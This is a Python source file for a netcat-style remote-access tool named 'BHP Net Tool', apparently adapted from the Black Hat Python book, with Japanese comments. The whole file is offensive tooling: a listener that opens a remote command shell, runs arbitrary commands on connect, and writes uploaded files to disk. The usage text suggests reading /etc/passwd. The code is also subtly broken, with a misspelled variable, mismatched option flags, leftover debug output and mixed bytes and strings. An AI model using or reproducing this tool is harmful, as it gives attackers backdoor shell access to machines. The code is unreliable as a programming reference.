# coding:utf-8

import sys,socket,getopt,threading,subprocess

#グローバル変数
listen=False
command=False
upload=False
execute=""
target=""
upload_destination=""
port=0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for")
    print("                           incoming connections")
    print("-e --execute=file_to_run - execute the given file upon")
    print("                           receiving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a")
    print("                           file and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -1 -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -1 -u c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -1 -e \"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        
        if len(buffer):
            client.send(buffer)
        
        while True:
            
            recv_len=1
            response=""
            
            while recv_len:
                data = client.recv(4096).decode('shift_jis')
                recv_len=len(data)
                response+=data
                
                if recv_len < 4096:
                    break
                
            print(response, end="")
            
            #追加入力待機
            buffer=input("")
            buffer+="\n"
            client.send(buffer.encode('ascii'))
    
    except:
        print("[*] Exception! Exiting")
        
        client.close()

def server_loop():
    global target
    
    if not len(target):
        target="0.0.0.0"
        
    server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    server.bind((target, port))
    
    server.listen(5)
    
    while True:
        client_socket, addr=server.accept()
        
        client_thread=threading.Thread(
        target=client_handler, args=(client_socket,))
        client_thread.start()
        
def run_command(command):
    command=command.rstrip()
    
    try:
        output=subprocess.check_output(
        command, stderr=subprocess.STDOUT, shell=True)
    except:
        output="Failed to execute command.\r\n"
        
    return output


def client_handler(client_socket):
    global upload, execute, command
    
    #全データを読み取り、指定されたファイルに書き込み
    if len(upload_destination):
        file_buffer=""
        
        while True:
            data=str(client_socket.recv(1024))
            
            if len(data)==0:
                break
            else:
                file_buffer += data
            
        try:
            file_descriptor=open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            client_socket.send(
            b"Successfully saved file to %s\r\n" % uppload_destination)
        except:
            client_socket.send(
            b"Failed to save file to %s\r\n" % uppload_destination)
    
    if len(execute):
        output = run_command(execute).encode('shift_jis')
        
        client_socket.send(output)
        print(3)
    if command:
        
        prompt="<BHP:#> ".encode("shift_jis")
        client_socket.send(prompt)
        
        while True:
            #改行まで
            cmd_buffer=""
            
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024).decode("ascii")
            
            response=run_command(cmd_buffer)
            response+=prompt
            
            client_socket.send(response)
            
            

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
    
    #コマンドラインオプション読み込み
    try:
        opts, args = getopt.getopt(
                 sys.argv[1:],
                "hle:t:p:cu",
                 ["help", "listen", "execute=", "target=",
                  "port=", "command", "upload="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen=True
        elif o in ("-e", "--execute"):
            execute=a
        elif o in ("-c", "--commandshell"):
            command=True
        elif o in ("-u", "--upload"):
            upload_destination=a
        elif o in ("-t", "--target"):
            target=a
        elif o in ("-p", "--port"):
            port=int(a)
        else:
            assert False, "Unhandled Option"
    
    #接続待機　OR　標準入力データ送信
    if not listen and len(target) and port > 0:
        buffer=sys.stdin.read()
        
        client_sender(buffer)
        
    if listen:
        server_loop()

main()

